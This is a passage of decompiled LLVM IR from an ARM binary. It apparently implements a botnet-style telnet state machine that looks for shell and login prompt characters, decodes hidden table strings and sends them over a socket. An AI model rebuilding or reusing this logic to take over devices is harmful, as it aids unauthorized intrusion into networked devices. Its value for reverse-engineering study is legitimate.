dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb18
  %v2_fb20 = icmp ugt i8 %v3_fb3c, 34
  store i1 %v2_fb20, i1* %cpsr_c.global-to-local, align 1
  %v7_fb20 = icmp eq i8 %v3_fb3c, 35
  store i1 %v7_fb20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb20, label %dec_label_pc_fb4c, label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %dec_label_pc_fb20
  %v2_fb28 = icmp ugt i8 %v3_fb3c, 36
  store i1 %v2_fb28, i1* %cpsr_c.global-to-local, align 1
  %v7_fb28 = icmp eq i8 %v3_fb3c, 37
  store i1 %v7_fb28, i1* %cpsr_z.global-to-local, align 1
  %v1_fb2c = add i32 %v0_fb2c, -1
  store i32 %v1_fb2c, i32* %r3.global-to-local, align 4
  br i1 %v7_fb28, label %dec_label_pc_fb4c, label %dec_label_pc_fb34

dec_label_pc_fb34:                                ; preds = %dec_label_pc_fb34.preheader, %dec_label_pc_fb28
  %v0_fb2c = phi i32 [ %v2_fb0c, %dec_label_pc_fb34.preheader ], [ %v1_fb2c, %dec_label_pc_fb28 ]
  %v0_fb34 = phi i32 [ %v1_fad4, %dec_label_pc_fb34.preheader ], [ %v1_fb34, %dec_label_pc_fb28 ]
  %v1_fb34 = add i32 %v0_fb34, -1
  store i32 %v1_fb34, i32* %r1.global-to-local, align 4
  %v2_fb34 = icmp ne i32 %v0_fb34, 0
  store i1 %v2_fb34, i1* %cpsr_c.global-to-local, align 1
  %v7_fb34 = icmp eq i32 %v0_fb34, 1
  store i1 %v7_fb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb34, label %dec_label_pc_f6b4.backedge.thread562, label %dec_label_pc_fb3c

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_fb34
  %v1_fb3c = add i32 %v0_fb2c, -2
  %v2_fb3c = inttoptr i32 %v1_fb3c to i8*
  %v3_fb3c = load i8, i8* %v2_fb3c, align 1
  %v4_fb3c = zext i8 %v3_fb3c to i32
  store i32 %v4_fb3c, i32* %r2.global-to-local, align 4
  %v2_fb40 = icmp ugt i8 %v3_fb3c, 61
  store i1 %v2_fb40, i1* %cpsr_c.global-to-local, align 1
  %v7_fb40 = icmp eq i8 %v3_fb3c, 62
  store i1 %v7_fb40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb40, label %dec_label_pc_fb4c, label %bb439

bb439:                                            ; preds = %dec_label_pc_fb3c
  %v3_fb44 = icmp ugt i8 %v3_fb3c, 57
  store i1 %v3_fb44, i1* %cpsr_c.global-to-local, align 1
  %v8_fb44 = icmp eq i8 %v3_fb3c, 58
  store i1 %v8_fb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fb44, label %dec_label_pc_fb4c, label %dec_label_pc_fb18

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_fb3c, %bb439, %dec_label_pc_fb28, %dec_label_pc_fb20, %dec_label_pc_fb18, %dec_label_pc_fb04, %dec_label_pc_fae0, %dec_label_pc_fafc, %dec_label_pc_faf4, %bb438
  %v0_fb50 = phi i32 [ %v1_fad4, %dec_label_pc_fb04 ], [ %v1_fad4, %dec_label_pc_fae0 ], [ %v1_fad4, %dec_label_pc_fafc ], [ %v1_fad4, %dec_label_pc_faf4 ], [ %v1_fad4, %bb438 ], [ %v1_fb34, %dec_label_pc_fb18 ], [ %v1_fb34, %dec_label_pc_fb20 ], [ %v1_fb34, %dec_label_pc_fb28 ], [ %v1_fb34, %bb439 ], [ %v1_fb34, %dec_label_pc_fb3c ]
  %v1_fb50 = add i32 %v0_fb50, 1
  store i32 %v1_fb50, i32* @r7, align 4
  %v1_fb54 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_fb64 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  %v3_fb68 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fb68, i32* %r2.global-to-local, align 4
  store i32 %v3_fb64, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fb74 = load i32, i32* @r6, align 4
  %v1_fb74 = add i32 %v0_fb74, 4
  %v2_fb74 = inttoptr i32 %v1_fb74 to i32*
  %v3_fb74 = load i32, i32* %v2_fb74, align 4
  %v4_fb78 = call i32 @__libc_send(i32 %v3_fb74, i32 %v3_fb64, i32 %v3_fb68, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fb88 = load i32, i32* @r6, align 4
  %v1_fb88 = add i32 %v0_fb88, 4
  %v2_fb88 = inttoptr i32 %v1_fb88 to i32*
  %v3_fb88 = load i32, i32* %v2_fb88, align 4
  %v4_fb8c = call i32 @__libc_send(i32 %v3_fb88, i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32 2, i32 16384)
  %v1_fb94 = call i32 @table_lock_val(i32 8)
  store i32 7, i32* @r3, align 4
  %v1_fb9c = load i32, i32* @r6, align 4
  %v2_fb9c = add i32 %v1_fb9c, 12
  %v3_fb9c = inttoptr i32 %v2_fb9c to i32*
  store i32 7, i32* %v3_fb9c, align 4
  br label %dec_label_pc_f904

dec_label_pc_fba4:                                ; preds = %dec_label_pc_f734
  %v1_fba4 = add i32 %v0_f734, 24
  %v2_fba4 = inttoptr i32 %v1_fba4 to i32*
  %v3_fba4 = load i32, i32* %v2_fba4, align 4
  store i32 %v3_fba4, i32* %r2.global-to-local, align 4
  %v1_fba8 = add i32 %v3_fba4, -1
  store i32 %v1_fba8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fbac = icmp eq i32 %v1_fba8, 0
  store i1 %v2_fbac, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_fba8, 1
  br i1 %tmp440, label %dec_label_pc_f6b4.backedge.thread, label %dec_label_pc_fbb4

dec_label_pc_fbb4:                                ; preds = %dec_label_pc_fba4
  %v2_fbb4 = add i32 %v1_fba8, %v0_f734
  store i32 %v2_fbb4, i32* %r3.global-to-local, align 4
  %v1_fbb8 = add i32 %v2_fbb4, 28
  %v2_fbb8 = inttoptr i32 %v1_fbb8 to i8*
  %v3_fbb8 = load i8, i8* %v2_fbb8, align 1
  %v4_fbb8 = zext i8 %v3_fbb8 to i32
  store i32 %v4_fbb8, i32* %r3.global-to-local, align 4
  %v2_fbbc = icmp ugt i8 %v3_fbb8, 61
  store i1 %v2_fbbc, i1* %cpsr_c.global-to-local, align 1
  %v7_fbbc = icmp eq i8 %v3_fbb8, 62
  store i1 %v7_fbbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbbc, label %dec_label_pc_fc20, label %bb441

bb441:                                            ; preds = %dec_label_pc_fbb4
  %v3_fbc0 = icmp ugt i8 %v3_fbb8, 57
  store i1 %v3_fbc0, i1* %cpsr_c.global-to-local, align 1
  %v8_fbc0 = icmp eq i8 %v3_fbb8, 58
  store i1 %v8_fbc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fbc0, label %dec_label_pc_fc20, label %dec_label_pc_fbc8

dec_label_pc_fbc8:                                ; preds = %bb441
  %v2_fbc8 = icmp ugt i8 %v3_fbb8, 35
  store i1 %v2_fbc8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbc8 = icmp eq i8 %v3_fbb8, 36
  store i1 %v7_fbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbc8, label %dec_label_pc_fc20, label %dec_label_pc_fbd0

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fbc8
  %v2_fbd0 = icmp ugt i8 %v3_fbb8, 34
  store i1 %v2_fbd0, i1* %cpsr_c.global-to-local, align 1
  %v7_fbd0 = icmp eq i8 %v3_fbb8, 35
  store i1 %v7_fbd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbd0, label %dec_label_pc_fc20, label %dec_label_pc_fbd8

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fbd0
  %v2_fbd8 = icmp ugt i8 %v3_fbb8, 36
  store i1 %v2_fbd8, i1* %cpsr_c.global-to-local, align 1
  %v7_fbd8 = icmp eq i8 %v3_fbb8, 37
  store i1 %v7_fbd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbd8, label %dec_label_pc_fc20, label %dec_label_pc_fc08.preheader

dec_label_pc_fc08.preheader:                      ; preds = %dec_label_pc_fbd8
  %v3_fbdc = add i32 %v0_f734, 28
  %v2_fbe0 = add i32 %v3_fbdc, %v3_fba4
  store i32 %v2_fbe0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fc08

dec_label_pc_fbec:                                ; preds = %bb442
  %v2_fbec = icmp ugt i8 %v3_fc10, 35
  store i1 %v2_fbec, i1* %cpsr_c.global-to-local, align 1
  %v7_fbec = icmp eq i8 %v3_fc10, 36
  store i1 %v7_fbec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbec, label %dec_label_pc_fc20, label %dec_label_pc_fbf4

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_fbec
  %v2_fbf4 = icmp ugt i8 %v3_fc10, 34
  store i1 %v2_fbf4, i1* %cpsr_c.global-to-local, align 1
  %v7_fbf4 = icmp eq i8 %v3_fc10, 35
  store i1 %v7_fbf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbf4, label %dec_label_pc_fc20, label %dec_label_pc_fbfc

dec_label_pc_fbfc:                                ; preds = %dec_label_pc_fbf4
  %v2_fbfc = icmp ugt i8 %v3_fc10, 36
  store i1 %v2_fbfc, i1* %cpsr_c.global-to-local, align 1
  %v7_fbfc = icmp eq i8 %v3_fc10, 37
  store i1 %v7_fbfc, i1* %cpsr_z.global-to-local, align 1
  %v1_fc00 = add i32 %v0_fc00, -1
  store i32 %v1_fc00, i32* %r3.global-to-local, align 4
  br i1 %v7_fbfc, label %dec_label_pc_fc20, label %dec_label_pc_fc08

dec_label_pc_fc08:                                ; preds = %dec_label_pc_fc08.preheader, %dec_label_pc_fbfc
  %v0_fc00 = phi i32 [ %v2_fbe0, %dec_label_pc_fc08.preheader ], [ %v1_fc00, %dec_label_pc_fbfc ]
  %v0_fc08 = phi i32 [ %v1_fba8, %dec_label_pc_fc08.preheader ], [ %v1_fc08, %dec_label_pc_fbfc ]
  %v1_fc08 = add i32 %v0_fc08, -1
  store i32 %v1_fc08, i32* %r1.global-to-local, align 4
  %v2_fc08 = icmp ne i32 %v0_fc08, 0
  store i1 %v2_fc08, i1* %cpsr_c.global-to-local, align 1
  %v7_fc08 = icmp eq i32 %v0_fc08, 1
  store i1 %v7_fc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc08, label %dec_label_pc_f6b4.backedge.thread562, label %dec_label_pc_fc10

dec_label_pc_fc10:                                ; preds = %dec_label_pc_fc08
  %v1_fc10 = add i32 %v0_fc00, -2
  %v2_fc10 = inttoptr i32 %v1_fc10 to i8*
  %v3_fc10 = load i8, i8* %v2_fc10, align 1
  %v4_fc10 = zext i8 %v3_fc10 to i32
  store i32 %v4_fc10, i32* %r2.global-to-local, align 4
  %v2_fc14 = icmp ugt i8 %v3_fc10, 61
  store i1 %v2_fc14, i1* %cpsr_c.global-to-local, align 1
  %v7_fc14 = icmp eq i8 %v3_fc10, 62
  store i1 %v7_fc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc14, label %dec_label_pc_fc20, label %bb442

bb442:                                            ; preds = %dec_label_pc_fc10
  %v3_fc18 = icmp ugt i8 %v3_fc10, 57
  store i1 %v3_fc18, i1* %cpsr_c.global-to-local, align 1
  %v8_fc18 = icmp eq i8 %v3_fc10, 58
  store i1 %v8_fc18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc18, label %dec_label_pc_fc20, label %dec_label_pc_fbec

dec_label_pc_fc20:                                ; preds = %dec_label_pc_fc10, %bb442, %dec_label_pc_fbfc, %dec_label_pc_fbf4, %dec_label_pc_fbec, %dec_label_pc_fbd8, %dec_label_pc_fbb4, %dec_label_pc_fbd0, %dec_label_pc_fbc8, %bb441
  %v0_fc24 = phi i32 [ %v1_fba8, %dec_label_pc_fbd8 ], [ %v1_fba8, %dec_label_pc_fbb4 ], [ %v1_fba8, %dec_label_pc_fbd0 ], [ %v1_fba8, %dec_label_pc_fbc8 ], [ %v1_fba8, %bb441 ], [ %v1_fc08, %dec_label_pc_fbec ], [ %v1_fc08, %dec_label_pc_fbf4 ], [ %v1_fc08, %dec_label_pc_fbfc ], [ %v1_fc08, %bb442 ], [ %v1_fc08, %dec_label_pc_fc10 ]
  %v1_fc24 = add i32 %v0_fc24, 1
  store i32 %v1_fc24, i32* @r7, align 4
  %v1_fc28 = call i32 @table_unlock_val(i32 7)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_fc38 = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  %v3_fc3c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fc3c, i32* %r2.global-to-local, align 4
  store i32 %v3_fc38, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fc48 = load i32, i32* @r6, align 4
  %v1_fc48 = add i32 %v0_fc48, 4
  %v2_fc48 = inttoptr i32 %v1_fc48 to i32*
  %v3_fc48 = load i32, i32* %v2_fc48, align 4
  %v4_fc4c = call i32 @__libc_send(i32 %v3_fc48, i32 %v3_fc38, i32 %v3_fc3c, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fc5c = load i32, i32* @r6, align 4
  %v1_fc5c = add i32 %v0_fc5c, 4
  %v2_fc5c = inttoptr i32 %v1_fc5c to i32*
  %v3_fc5c = load i32, i32* %v2_fc5c, align 4
  %v4_fc60 = call i32 @__libc_send(i32 %v3_fc5c, i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32 2, i32 16384)
  %v1_fc68 = call i32 @table_lock_val(i32 7)
  store i32 6, i32* @r3, align 4
  %v1_fc70 = load i32, i32* @r6, align 4
  %v2_fc70 = add i32 %v1_fc70, 12
  %v3_fc70 = inttoptr i32 %v2_fc70 to i32*
  store i32 6, i32* %v3_fc70, align 4
  br label %dec_label_pc_f904

dec_label_pc_fc78:                                ; preds = %dec_label_pc_f734
  %v1_fc78 = add i32 %v0_f734, 24
  %v2_fc78 = inttoptr i32 %v1_fc78 to i32*
  %v3_fc78 = load i32, i32* %v2_fc78, align 4
  store i32 %v3_fc78, i32* %r2.global-to-local, align 4
  %v1_fc7c = add i32 %v3_fc78, -1
  store i32 %v1_fc7c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc80 = icmp eq i32 %v1_fc7c, 0
  store i1 %v2_fc80, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_fc7c, 1
  br i1 %tmp443, label %dec_label_pc_f6b4.backedge.thread, label %dec_label_pc_fc88

dec_label_pc_fc88:                                ; preds = %dec_label_pc_fc78
  %v2_fc88 = add i32 %v1_fc7c, %v0_f734
  store i32 %v2_fc88, i32* %r3.global-to-local, align 4
  %v1_fc8c = add i32 %v2_fc88, 28
  %v2_fc8c = inttoptr i32 %v1_fc8c to i8*
  %v3_fc8c = load i8, i8* %v2_fc8c, align 1
  %v4_fc8c = zext i8 %v3_fc8c to i32
  store i32 %v4_fc8c, i32* %r3.global-to-local, align 4
  %v2_fc90 = icmp ugt i8 %v3_fc8c, 61
  store i1 %v2_fc90, i1* %cpsr_c.global-to-local, align 1
  %v7_fc90 = icmp eq i8 %v3_fc8c, 62
  store i1 %v7_fc90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc90, label %dec_label_pc_fd64, label %bb444

bb444:                                            ; preds = %dec_label_pc_fc88
  %v3_fc94 = icmp ugt i8 %v3_fc8c, 57
  store i1 %v3_fc94, i1* %cpsr_c.global-to-local, align 1
  %v8_fc94 = icmp eq i8 %v3_fc8c, 58
  store i1 %v8_fc94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fc94, label %dec_label_pc_fd64, label %dec_label_pc_fc9c

dec_label_pc_fc9c:                                ; preds = %bb444
  %v2_fc9c = icmp ugt i8 %v3_fc8c, 35
  store i1 %v2_fc9c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc9c = icmp eq i8 %v3_fc8c, 36
  store i1 %v7_fc9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc9c, label %dec_label_pc_fd64, label %dec_label_pc_fca4

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc9c
  %v2_fca4 = icmp ugt i8 %v3_fc8c, 34
  store i1 %v2_fca4, i1* %cpsr_c.global-to-local, align 1
  %v7_fca4 = icmp eq i8 %v3_fc8c, 35
  store i1 %v7_fca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fca4, label %dec_label_pc_fd64, label %dec_label_pc_fcac

dec_label_pc_fcac:                                ; preds = %dec_label_pc_fca4
  %v2_fcac = icmp ugt i8 %v3_fc8c, 36
  store i1 %v2_fcac, i1* %cpsr_c.global-to-local, align 1
  %v7_fcac = icmp eq i8 %v3_fc8c, 37
  store i1 %v7_fcac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fcac, label %dec_label_pc_fd64, label %dec_label_pc_fd4c.preheader

dec_label_pc_fd4c.preheader:                      ; preds = %dec_label_pc_fcac
  %v3_fcb0 = add i32 %v0_f734, 28
  %v2_fcb4 = add i32 %v3_fcb0, %v3_fc78
  store i32 %v2_fcb4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fd4c

dec_label_pc_fd30:                                ; preds = %bb445
  %v2_fd30 = icmp ugt i8 %v3_fd54, 35
  store i1 %v2_fd30, i1* %cpsr_c.global-to-local, align 1
  %v7_fd30 = icmp eq i8 %v3_fd54, 36
  store i1 %v7_fd30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd30, label %dec_label_pc_fd64, label %dec_label_pc_fd38

dec_label_pc_fd38:                                ; preds = %dec_label_pc_fd30
  %v2_fd38 = icmp ugt i8 %v3_fd54, 34
  store i1 %v2_fd38, i1* %cpsr_c.global-to-local, align 1
  %v7_fd38 = icmp eq i8 %v3_fd54, 35
  store i1 %v7_fd38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd38, label %dec_label_pc_fd64, label %dec_label_pc_fd40

dec_label_pc_fd40:                                ; preds = %dec_label_pc_fd38
  %v2_fd40 = icmp ugt i8 %v3_fd54, 36
  store i1 %v2_fd40, i1* %cpsr_c.global-to-local, align 1
  %v7_fd40 = icmp eq i8 %v3_fd54, 37
  store i1 %v7_fd40, i1* %cpsr_z.global-to-local, align 1
  %v1_fd44 = add i32 %v0_fd44, -1
  store i32 %v1_fd44, i32* %r3.global-to-local, align 4
  br i1 %v7_fd40, label %dec_label_pc_fd64, label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %dec_label_pc_fd4c.preheader, %dec_label_pc_fd40
  %v0_fd44 = phi i32 [ %v2_fcb4, %dec_label_pc_fd4c.preheader ], [ %v1_fd44, %dec_label_pc_fd40 ]
  %v0_fd4c = phi i32 [ %v1_fc7c, %dec_label_pc_fd4c.preheader ], [ %v1_fd4c, %dec_label_pc_fd40 ]
  %v1_fd4c = add i32 %v0_fd4c, -1
  store i32 %v1_fd4c, i32* %r1.global-to-local, align 4
  %v2_fd4c = icmp ne i32 %v0_fd4c, 0
  store i1 %v2_fd4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fd4c = icmp eq i32 %v0_fd4c, 1
  store i1 %v7_fd4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd4c, label %dec_label_pc_f6b4.backedge.thread562, label %dec_label_pc_fd54

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd4c
  %v1_fd54 = add i32 %v0_fd44, -2
  %v2_fd54 = inttoptr i32 %v1_fd54 to i8*
  %v3_fd54 = load i8, i8* %v2_fd54, align 1
  %v4_fd54 = zext i8 %v3_fd54 to i32
  store i32 %v4_fd54, i32* %r2.global-to-local, align 4
  %v2_fd58 = icmp ugt i8 %v3_fd54, 61
  store i1 %v2_fd58, i1* %cpsr_c.global-to-local, align 1
  %v7_fd58 = icmp eq i8 %v3_fd54, 62
  store i1 %v7_fd58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd58, label %dec_label_pc_fd64, label %bb445

bb445:                                            ; preds = %dec_label_pc_fd54
  %v3_fd5c = icmp ugt i8 %v3_fd54, 57
  store i1 %v3_fd5c, i1* %cpsr_c.global-to-local, align 1
  %v8_fd5c = icmp eq i8 %v3_fd54, 58
  store i1 %v8_fd5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fd5c, label %dec_label_pc_fd64, label %dec_label_pc_fd30

dec_label_pc_fd64:                                ; preds = %dec_label_pc_fd54, %bb445, %dec_label_pc_fd40, %dec_label_pc_fd38, %dec_label_pc_fd30, %dec_label_pc_fcac, %dec_label_pc_fc88, %dec_label_pc_fca4, %dec_label_pc_fc9c, %bb444
  %v0_fd68 = phi i32 [ %v1_fc7c, %dec_label_pc_fcac ], [ %v1_fc7c, %dec_label_pc_fc88 ], [ %v1_fc7c, %dec_label_pc_fca4 ], [ %v1_fc7c, %dec_label_pc_fc9c ], [ %v1_fc7c, %bb444 ], [ %v1_fd4c, %dec_label_pc_fd30 ], [ %v1_fd4c, %dec_label_pc_fd38 ], [ %v1_fd4c, %dec_label_pc_fd40 ], [ %v1_fd4c, %bb445 ], [ %v1_fd4c, %dec_label_pc_fd54 ]
  %v1_fd68 = add i32 %v0_fd68, 1
  store i32 %v1_fd68, i32* @r7, align 4
  %v1_fd6c = call i32 @table_unlock_val(i32 9)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
  %v3_fd7c = call i32 @table_retrieve_val(i32 9, i32* nonnull %stack_var_-60)
  %v3_fd80 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fd80, i32* %r2.global-to-local, align 4
  store i32 %v3_fd7c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fd8c = load i32, i32* @r6, align 4
  %v1_fd8c = add i32 %v0_fd8c, 4
  %v2_fd8c = inttoptr i32 %v1_fd8c to i32*
  %v3_fd8c = load i32, i32* %v2_fd8c, align 4
  %v4_fd90 = call i32 @__libc_send(i32 %v3_fd8c, i32 %v3_fd7c, i32 %v3_fd80, i32 16384)
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fda0 = load i32, i32* @r6, align 4
  %v1_fda0 = add i32 %v0_fda0, 4
  %v2_fda0 = inttoptr i32 %v1_fda0 to i32*
  %v3_fda0 = load i32, i32* %v2_fda0, align 4
  %v4_fda4 = call i32 @__libc_send(i32 %v3_fda0, i32 ptrtoint ([3 x i8]* @global_var_19af4.208 to i32), i32 2, i32 16384)
  %v1_fdac = call i32 @table_lock_val(i32 9)
  store i32 9, i32* @r3, align 4
  %v1_fdb4 = load i32, i32* @r6, align 4
  %v2_fdb4 = add i32 %v1_fdb4, 12
  %v3_fdb4 = inttoptr i32 %v2_fdb4 to i32*
  store i32 9, i32* %v3_fdb4, align 4
  br label %dec_label_pc_f904

dec_label_pc_fdbc:                                ; preds = %dec_label_pc_f734
  %v1_fdbc = add i32 %v0_f734, 24
  %v2_fdbc = inttoptr i32 %v1_fdbc to i32*
  %v3_fdbc = load i32, i32* %v2_fdbc, align 4
  store i32 %v3_fdbc, i32* %r2.global-to-local, align 4
  %v1_fdc0 = add i32 %v3_fdbc, -1
  store i32 %v1_fdc0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fdc4 = icmp eq i32 %v1_fdc0, 0
  store i1 %v2_fdc4, i1* %cpsr_z.global-to-local, align 1
  %tmp446 = icmp slt i32 %v1_fdc0, 1
  br i1 %tmp446, label %dec_label_pc_fe28, label %dec_label_pc_fdcc

dec_label_pc_fdcc:                                ; preds = %dec_label_pc_fdbc
  %v2_fdcc = add i32 %v1_fdc0, %v0_f734
  store i32 %v2_fdcc, i32* %r3.global-to-local, align 4
  %v1_fdd0 = add i32 %v2_fdcc, 28
  %v2_fdd0 = inttoptr i32 %v1_fdd0 to i8*
  %v3_fdd0 = load i8, i8* %v2_fdd0, align 1
  %v4_fdd0 = zext i8 %v3_fdd0 to i32
  store i32 %v4_fdd0, i32* %r3.global-to-local, align 4
  %v2_fdd4 = icmp ugt i8 %v3_fdd0, 61
  store i1 %v2_fdd4, i1* %cpsr_c.global-to-local, align 1
  %v7_fdd4 = icmp eq i8 %v3_fdd0, 62
  store i1 %v7_fdd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdd4, label %dec_label_pc_1015c, label %bb447

bb447:                                            ; preds = %dec_label_pc_fdcc
  %v3_fdd8 = icmp ugt i8 %v3_fdd0, 57
  store i1 %v3_fdd8, i1* %cpsr_c.global-to-local, align 1
  %v8_fdd8 = icmp eq i8 %v3_fdd0, 58
  store i1 %v8_fdd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fdd8, label %dec_label_pc_1015c, label %dec_label_pc_fde0

dec_label_pc_fde0:                                ; preds = %bb447
  %v2_fde0 = icmp ugt i8 %v3_fdd0, 35
  store i1 %v2_fde0, i1* %cpsr_c.global-to-local, align 1
  %v7_fde0 = icmp eq i8 %v3_fdd0, 36
  store i1 %v7_fde0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fde0, label %dec_label_pc_1015c, label %dec_label_pc_fde8

dec_label_pc_fde8:                                ; preds = %dec_label_pc_fde0
  %v2_fde8 = icmp ugt i8 %v3_fdd0, 34
  store i1 %v2_fde8, i1* %cpsr_c.global-to-local, align 1
  %v7_fde8 = icmp eq i8 %v3_fdd0, 35
  store i1 %v7_fde8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fde8, label %dec_label_pc_1015c, label %dec_label_pc_fe20.preheader

dec_label_pc_fe20.preheader:                      ; preds = %dec_label_pc_fde8
  %v3_fdec = add i32 %v0_f734, 28
  %v2_fdf0 = add i32 %v3_fdec, %v3_fdbc
  store i32 %v2_fdf0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe20

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_fe20
  %v1_fdfc = add i32 %v0_fe18, -2
  %v2_fdfc = inttoptr i32 %v1_fdfc to i8*
  %v3_fdfc = load i8, i8* %v2_fdfc, align 1
  %v4_fdfc = zext i8 %v3_fdfc to i32
  store i32 %v4_fdfc, i32* %r2.global-to-local, align 4
  %v2_fe00 = icmp ugt i8 %v3_fdfc, 61
  store i1 %v2_fe00, i1* %cpsr_c.global-to-local, align 1
  %v7_fe00 = icmp eq i8 %v3_fdfc, 62
  store i1 %v7_fe00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe00, label %dec_label_pc_1015c, label %bb448

bb448:                                            ; preds = %dec_label_pc_fdfc
  %v3_fe04 = icmp ugt i8 %v3_fdfc, 57
  store i1 %v3_fe04, i1* %cpsr_c.global-to-local, align 1
  %v8_fe04 = icmp eq i8 %v3_fdfc, 58
  store i1 %v8_fe04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fe04, label %dec_label_pc_1015c, label %dec_label_pc_fe0c

dec_label_pc_fe0c:                                ; preds = %bb448
  %v2_fe0c = icmp ugt i8 %v3_fdfc, 35
  store i1 %v2_fe0c, i1* %cpsr_c.global-to-local, align 1
  %v7_fe0c = icmp eq i8 %v3_fdfc, 36
  store i1 %v7_fe0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe0c, label %dec_label_pc_1015c, label %dec_label_pc_fe14

dec_label_pc_fe14:                                ; preds = %dec_label_pc_fe0c
  %v2_fe14 = icmp ugt i8 %v3_fdfc, 34
  store i1 %v2_fe14, i1* %cpsr_c.global-to-local, align 1
  %v7_fe14 = icmp eq i8 %v3_fdfc, 35
  store i1 %v7_fe14, i1* %cpsr_z.global-to-local, align 1
  %v1_fe18 = add i32 %v0_fe18, -1
  store i32 %v1_fe18, i32* %r3.global-to-local, align 4
  br i1 %v7_fe14, label %dec_label_pc_1015c, label %dec_label_pc_fe20

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fe20.preheader, %dec_label_pc_fe14
  %v0_fe18 = phi i32 [ %v2_fdf0, %dec_label_pc_fe20.preheader ], [ %v1_fe18, %dec_label_pc_fe14 ]
  %v0_fe20 = phi i32 [ %v1_fdc0, %dec_label_pc_fe20.preheader ], [ %v1_fe20, %dec_label_pc_fe14 ]
  %v1_fe20 = add i32 %v0_fe20, -1
  store i32 %v1_fe20, i32* %r1.global-to-local, align 4
  %v2_fe20 = icmp ne i32 %v0_fe20, 0
  store i1 %v2_fe20, i1* %cpsr_c.global-to-local, align 1
  %v7_fe20 = icmp eq i32 %v0_fe20, 1
  store i1 %v7_fe20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe20, label %dec_label_pc_fe28, label %dec_label_pc_fdfc

dec_label_pc_fe28:                                ; preds = %dec_label_pc_fe20, %dec_label_pc_fdbc
  %v1_fe2c = call i32 @table_unlock_val(i32 30)
  store i32 %v2_1000c, i32* %r1.global-to-local, align 4
